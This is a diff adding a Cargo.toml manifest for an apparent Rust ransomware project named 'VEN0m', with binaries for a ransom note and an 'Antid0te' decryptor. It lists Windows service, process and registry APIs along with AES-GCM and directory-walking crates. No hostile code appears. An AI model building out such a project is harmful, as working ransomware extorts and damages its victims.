@@ -1,0 +1,49 @@
+[package]
+name = "VEN0m"
+version = "0.1.0"
+edition = "2024"
+
+
+
+[dependencies]
+
+anyhow = "1.0"
+winapi = { version = "0.3", features = ["securitybaseapi", "shellapi", "synchapi", "winsvc", "winbase", "winuser", "sysinfoapi", "winnt", "ntstatus", "processthreadsapi", "tlhelp32", "handleapi", "errhandlingapi", "psapi", "libloaderapi", "fileapi", "ioapiset"] }
+windows-service = "0.6.0"
+aes-gcm = { version = "0.10", features = ["std"] }
+winreg = "0.10"
+chrono = "0.4"
+eframe = "0.22"
+egui = "0.22"
+walkdir = "2"
+image = "0.24"
+
+clap = { version = "4.5.53", features = ["derive"] }
+
+[build-dependencies]
+cc = "1.0"
+winres = "0.1"
+
+
+[[bin]]
+
+name = "note"
+path = "src/ransom_note.rs"
+
+[[bin]]
+
+name = "Antid0te"
+path = "src/antidote.rs"
+
+[features]
+1 = []
+2 = []
+
+
+[package.metadata.winres]
+
+FileDescription = "VEN0m"
+ProductName = "VEN0m"
+OriginalFilename = "VEN0m.exe"
+Icon = "icons\\icon.ico"
+ProductVersion = "1.0.0"
